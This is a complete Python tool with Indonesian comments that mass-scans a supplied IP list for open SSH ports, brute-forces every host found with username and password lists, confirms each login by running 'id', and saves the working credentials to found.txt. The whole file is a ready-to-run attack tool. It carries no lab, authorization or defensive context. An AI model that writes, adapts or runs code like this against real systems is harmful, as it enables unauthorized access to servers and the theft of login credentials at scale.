#!/usr/bin/python3
# ssh_brute_auto.py - Auto detect SSH + Brute
import paramiko
import socket
import sys
import threading
import queue
import time

print("""
███████╗███████╗██╗  ██╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔════╝██╔════╝██║  ██║    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
███████╗███████╗███████║    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
╚════██║╚════██║██╔══██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
███████║███████║██║  ██║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
""")

class SSHScanner:
    def __init__(self):
        self.ssh_hosts = []
        self.lock = threading.Lock()
        self.queue = queue.Queue()
        
    def check_ssh(self, ip, port=22, timeout=2):
        """Check jika port SSH open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                # Coba baca banner SSH
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    sock.connect((ip, port))
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    sock.close()
                    
                    if 'SSH' in banner or 'OpenSSH' in banner:
                        with self.lock:
                            self.ssh_hosts.append(ip)
                        print(f"[+] SSH found: {ip}:{port} - {banner[:50]}")
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    def scan_ips(self, ip_file, threads=50):
        """Scan IP list untuk SSH"""
        print(f"[*] Loading IPs from {ip_file}")
        with open(ip_file, 'r') as f:
            ips = [line.strip() for line in f if line.strip()]
        
        print(f"[*] Scanning {len(ips)} IPs for SSH...")
        
        def worker():
            while True:
                try:
                    ip = self.queue.get(timeout=1)
                    self.check_ssh(ip)
                    self.queue.task_done()
                except queue.Empty:
                    break
        
        # Masukkan semua IP ke queue
        for ip in ips:
            self.queue.put(ip)
        
        # Start threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Tunggu sampai selesai
        self.queue.join()
        
        print(f"\n[*] Found {len(self.ssh_hosts)} SSH hosts")
        return self.ssh_hosts

class SSHBruter:
    def __init__(self):
        self.found = []
        self.tried = 0
        self.lock = threading.Lock()
        
    def brute(self, ip, username, password, timeout=3):
        """Brute force satu kombinasi"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, 
                       username=username, 
                       password=password,
                       timeout=timeout,
                       banner_timeout=10,
                       auth_timeout=10)
            
            # Execute command untuk verifikasi
            stdin, stdout, stderr = ssh.exec_command('id', timeout=2)
            output = stdout.read().decode()
            
            with self.lock:
                self.found.append({
                    'ip': ip,
                    'user': username,
                    'pass': password,
                    'output': output[:100]
                })
            
            ssh.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except:
            return False
        finally:
            with self.lock:
                self.tried += 1
                if self.tried % 100 == 0:
                    print(f"[*] Tried: {self.tried} | Found: {len(self.found)}", end='\r')
    
    def brute_host(self, ip, users, passes, threads=5):
        """Brute force satu host"""
        print(f"\n[*] Bruting {ip}")
        
        # Buat queue untuk kombinasi
        combo_queue = queue.Queue()
        for user in users:
            for pwd in passes:
                combo_queue.put((user, pwd))
        
        def worker():
            while True:
                try:
                    user, pwd = combo_queue.get(timeout=1)
                    if self.brute(ip, user, pwd):
                        print(f"\n[+] FOUND: {ip} | {user}:{pwd}")
                        # Hentikan brute untuk host ini
                        while not combo_queue.empty():
                            combo_queue.get()
                            combo_queue.task_done()
                    combo_queue.task_done()
                except queue.Empty:
                    break
        
        # Start threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Tunggu selesai
        combo_queue.join()
        
        return any([t.is_alive() for t in thread_list])

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ssh_brute_auto.py <ip_list.txt>")
        print("Optional: -u users.txt -p passwords.txt -t threads")
        sys.exit(1)
    
    ip_file = sys.argv[1]
    
    # Default files
    user_file = 'users.txt'
    pass_file = 'passwords.txt'
    threads = 10
    
    # Parse arguments
    for i in range(2, len(sys.argv)):
        if sys.argv[i] == '-u' and i+1 < len(sys.argv):
            user_file = sys.argv[i+1]
        elif sys.argv[i] == '-p' and i+1 < len(sys.argv):
            pass_file = sys.argv[i+1]
        elif sys.argv[i] == '-t' and i+1 < len(sys.argv):
            threads = int(sys.argv[i+1])
    
    # Load user/pass files
    print("[*] Loading credentials...")
    with open(user_file, 'r') as f:
        users = [line.strip() for line in f if line.strip()]
    
    with open(pass_file, 'r') as f:
        passes = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Users: {len(users)}, Passwords: {len(passes)}")
    
    # Step 1: Scan for SSH hosts
    scanner = SSHScanner()
    ssh_hosts = scanner.scan_ips(ip_file, threads=threads)
    
    if not ssh_hosts:
        print("[-] No SSH hosts found!")
        sys.exit(0)
    
    # Step 2: Brute force
    print("\n" + "="*50)
    print("[*] Starting brute force...")
    print("="*50)
    
    bruter = SSHBruter()
    
    for ip in ssh_hosts:
        bruter.brute_host(ip, users, passes, threads=5)
        time.sleep(0.5)  # Delay antar host
    
    # Results
    print("\n" + "="*50)
    print("[*] BRUTE FORCE COMPLETE")
    print("="*50)
    print(f"[*] Total tried: {bruter.tried}")
    print(f"[*] Credentials found: {len(bruter.found)}")
    
    if bruter.found:
        print("\n[+] FOUND CREDENTIALS:")
        for cred in bruter.found:
            print(f"    {cred['ip']} | {cred['user']}:{cred['pass']}")
        
        # Save to file
        with open('found.txt', 'w') as f:
            for cred in bruter.found:
                f.write(f"{cred['ip']} {cred['user']} {cred['pass']}\n")
        print(f"\n[*] Saved to found.txt")

if __name__ == "__main__":
    main()